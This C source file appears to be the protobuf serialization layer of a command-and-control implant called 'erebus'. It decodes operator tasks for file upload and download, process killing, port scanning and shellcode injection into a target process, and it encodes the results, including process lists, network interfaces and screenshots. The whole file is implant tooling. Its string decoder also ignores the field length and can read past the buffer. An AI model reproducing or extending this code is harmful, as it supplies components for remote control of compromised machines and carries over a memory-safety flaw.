#include <stdlib.h>
#include <string.h>

#include "erebus/pb_c2.h"
#include "erebus/pb_wire.h"

static void copy_str(char *dst, size_t cap, const char *src) {
    if (!src) src = "";
    strncpy(dst, src, cap - 1);
    dst[cap - 1] = '\0';
}

static int decode_string_field(erebus_pb_reader *r, uint8_t wire, char *dst, size_t cap) {
    const uint8_t *b;
    size_t n;
    if (wire != 2 || !erebus_pb_read_bytes(r, &b, &n)) return 0;
    copy_str(dst, cap, (const char *)b);
    return 1;
}

static int decode_bytes_field(erebus_pb_reader *r, uint8_t wire, uint8_t **out, size_t *out_len) {
    const uint8_t *b;
    size_t n;
    if (wire != 2 || !erebus_pb_read_bytes(r, &b, &n)) return 0;
    *out = (uint8_t *)malloc(n);
    if (!*out) return 0;
    memcpy(*out, b, n);
    *out_len = n;
    return 1;
}

static int append_ports_from_packed(const uint8_t *b, size_t n, erebus_portscan_task *t) {
    erebus_pb_reader pr;
    erebus_pb_reader_init(&pr, b, n);
    while (pr.pos < pr.len && t->port_count < EREBUS_MAX_PORTS) {
        uint64_t v;
        if (!erebus_pb_read_varint(&pr, &v)) break;
        t->ports[t->port_count++] = (uint32_t)v;
    }
    return 1;
}

static int encode_process_info(const erebus_process_info *p, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 128)) return 0;
    erebus_pb_write_uint32(&w, 1, p->pid);
    erebus_pb_write_uint32(&w, 2, p->ppid);
    erebus_pb_write_string(&w, 3, p->name);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

static int encode_net_iface(const erebus_net_interface *iface, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 512)) return 0;
    erebus_pb_write_string(&w, 1, iface->name);
    for (size_t i = 0; i < iface->address_count; i++)
        erebus_pb_write_string(&w, 2, iface->addresses[i]);
    erebus_pb_write_string(&w, 3, iface->mac);
    erebus_pb_write_uint32(&w, 4, iface->mtu);
    erebus_pb_write_bool(&w, 5, iface->up);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

static int encode_port_result(const erebus_port_result *p, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 256)) return 0;
    erebus_pb_write_string(&w, 1, p->host);
    erebus_pb_write_uint32(&w, 2, p->port);
    erebus_pb_write_bool(&w, 3, p->open);
    if (p->service[0]) erebus_pb_write_string(&w, 4, p->service);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_decode_file_download_task(const uint8_t *in, size_t in_len, erebus_file_download_task *t) {
    memset(t, 0, sizeof(*t));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        if (field == 1) decode_string_field(&r, wire, t->remote_path, sizeof(t->remote_path));
        else if (!erebus_pb_skip(&r, wire)) return 0;
    }
    return 1;
}

int erebus_pb_decode_file_upload_task(const uint8_t *in, size_t in_len, erebus_file_upload_task *t) {
    memset(t, 0, sizeof(*t));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        if (field == 1) decode_string_field(&r, wire, t->remote_path, sizeof(t->remote_path));
        else if (field == 2) decode_bytes_field(&r, wire, &t->data, &t->data_len);
        else if (!erebus_pb_skip(&r, wire)) return 0;
    }
    return 1;
}

void erebus_pb_free_file_upload_task(erebus_file_upload_task *t) {
    free(t->data);
    t->data = NULL;
    t->data_len = 0;
}

int erebus_pb_encode_file_download_result(const char *filename, const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, data_len + 256)) return 0;
    erebus_pb_write_string(&w, 1, filename);
    erebus_pb_write_bytes(&w, 2, data, data_len);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_file_upload_result(int success, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 32)) return 0;
    erebus_pb_write_bool(&w, 1, success);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_decode_process_kill_task(const uint8_t *in, size_t in_len, erebus_process_kill_task *t) {
    memset(t, 0, sizeof(*t));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    uint64_t v;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        if (field == 1 && erebus_pb_read_varint(&r, &v)) t->pid = (uint32_t)v;
        else if (!erebus_pb_skip(&r, wire)) return 0;
    }
    return 1;
}

int erebus_pb_encode_process_list_result(const erebus_process_info *procs, size_t count, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, count * 128 + 64)) return 0;
    for (size_t i = 0; i < count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_process_info(&procs[i], &sub, &sub_len)) {
            erebus_pb_writer_free(&w);
            return 0;
        }
        erebus_pb_write_bytes(&w, 1, sub, sub_len);
        free(sub);
    }
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_process_kill_result(int success, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 16)) return 0;
    erebus_pb_write_bool(&w, 1, success);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_net_ifconfig_result(const erebus_net_interface *ifaces, size_t count, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, count * 512 + 64)) return 0;
    for (size_t i = 0; i < count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_net_iface(&ifaces[i], &sub, &sub_len)) {
            erebus_pb_writer_free(&w);
            return 0;
        }
        erebus_pb_write_bytes(&w, 1, sub, sub_len);
        free(sub);
    }
    *out = w.data;
    *out_len = w.len;
    return 1;
}

void erebus_pb_free_net_ifconfig_result(erebus_net_interface *ifaces, size_t count) {
    if (!ifaces) return;
    for (size_t i = 0; i < count; i++) {
        if (ifaces[i].addresses) {
            for (size_t j = 0; j < ifaces[i].address_count; j++)
                free(ifaces[i].addresses[j]);
            free(ifaces[i].addresses);
        }
    }
    free(ifaces);
}

int erebus_pb_decode_portscan_task(const uint8_t *in, size_t in_len, erebus_portscan_task *t) {
    memset(t, 0, sizeof(*t));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    uint64_t v;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        const uint8_t *b;
        size_t n;
        switch (field) {
        case 1:
            decode_string_field(&r, wire, t->target, sizeof(t->target));
            break;
        case 2:
            if (wire == 2 && erebus_pb_read_bytes(&r, &b, &n))
                append_ports_from_packed(b, n, t);
            else if (wire == 0 && erebus_pb_read_varint(&r, &v) && t->port_count < EREBUS_MAX_PORTS)
                t->ports[t->port_count++] = (uint32_t)v;
            break;
        case 3:
            erebus_pb_read_varint(&r, &v);
            t->timeout_ms = (uint32_t)v;
            break;
        case 4:
            erebus_pb_read_varint(&r, &v);
            t->threads = (uint32_t)v;
            break;
        default:
            if (!erebus_pb_skip(&r, wire)) return 0;
        }
    }
    return 1;
}

int erebus_pb_encode_portscan_result(const erebus_port_result *ports, size_t count, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, count * 256 + 64)) return 0;
    for (size_t i = 0; i < count; i++) {
        uint8_t *sub = NULL;
        size_t sub_len = 0;
        if (!encode_port_result(&ports[i], &sub, &sub_len)) {
            erebus_pb_writer_free(&w);
            return 0;
        }
        erebus_pb_write_bytes(&w, 1, sub, sub_len);
        free(sub);
    }
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_decode_inject_task(const uint8_t *in, size_t in_len, erebus_inject_task *t) {
    memset(t, 0, sizeof(*t));
    erebus_pb_reader r;
    erebus_pb_reader_init(&r, in, in_len);
    uint32_t field;
    uint8_t wire;
    uint64_t v;
    while (erebus_pb_reader_next(&r, &field, &wire)) {
        switch (field) {
        case 1:
            decode_string_field(&r, wire, t->method, sizeof(t->method));
            break;
        case 2:
            erebus_pb_read_varint(&r, &v);
            t->target_pid = (uint32_t)v;
            break;
        case 3:
            decode_bytes_field(&r, wire, &t->shellcode, &t->shellcode_len);
            break;
        default:
            if (!erebus_pb_skip(&r, wire)) return 0;
        }
    }
    return 1;
}

void erebus_pb_free_inject_task(erebus_inject_task *t) {
    free(t->shellcode);
    t->shellcode = NULL;
    t->shellcode_len = 0;
}

int erebus_pb_encode_inject_result(int success, uint32_t pid, uint32_t tid, uint8_t **out, size_t *out_len) {
    erebus_pb_writer w;
    if (!erebus_pb_writer_init(&w, 64)) return 0;
    erebus_pb_write_bool(&w, 1, success);
    erebus_pb_write_uint32(&w, 2, pid);
    erebus_pb_write_uint32(&w, 3, tid);
    *out = w.data;
    *out_len = w.len;
    return 1;
}

int erebus_pb_encode_screenshot_result(const uint8_t *img, size_t img_len, uint32_t w, uint32_t h, uint8_t **out, size_t *out_len) {
    erebus_pb_writer pw;
    if (!erebus_pb_writer_init(&pw, img_len + 128)) return 0;
    erebus_pb_write_bytes(&pw, 1, img, img_len);
    erebus_pb_write_string(&pw, 2, "bmp");
    erebus_pb_write_uint32(&pw, 3, w);
    erebus_pb_write_uint32(&pw, 4, h);
    *out = pw.data;
    *out_len = pw.len;
    return 1;
}